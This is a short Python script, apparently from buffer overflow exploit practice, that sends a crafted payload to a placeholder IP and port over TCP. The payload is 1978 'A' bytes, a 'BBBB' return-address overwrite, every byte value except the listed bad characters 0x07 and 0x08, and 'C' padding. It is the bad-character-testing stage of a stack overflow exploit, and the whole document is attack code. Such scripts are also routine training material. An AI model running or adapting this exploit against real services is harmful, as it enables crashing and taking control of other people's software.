#! /usr/bin/env python3 

import socket

ip = "<IP>"
port = <PORT>


all_chars = bytearray(range(1,256))

bad_chars = [
     b"\x07",
     b"\x08",
]

for bad_char in bad_chars:
    all_chars = all_chars.replace(bad_char, b"")

prefix = b""
length = 5000
offset = 1978
new_eip = b"BBBB"

payload = prefix + b"A"*offset + new_eip + all_chars + b"C"* (length - len(new_eip) - offset - len(all_chars))

try: 
    with socket.socket() as s:
        s.connect((ip,port))
        s.send(payload)
        print ("[+] " + str(len(payload)-len(prefix)) + " Bytes Sent")
except:
    print ("[-] Crashed")